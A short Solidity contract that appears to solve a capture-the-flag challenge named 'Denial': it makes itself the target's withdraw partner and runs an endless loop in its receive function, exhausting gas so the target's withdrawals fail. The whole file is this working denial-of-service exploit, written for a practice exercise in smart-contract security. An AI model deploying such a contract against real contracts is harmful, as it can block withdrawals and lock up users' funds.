// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./20Denial.sol";

contract DenialSolution {
    Denial public denial;

    constructor(address denialAddress) {
        denial = Denial(payable(denialAddress));
    }

    function solveChallenge() public {
        denial.setWithdrawPartner(address(this));
    }

    receive() external payable {
        while (true) {}
    }
}
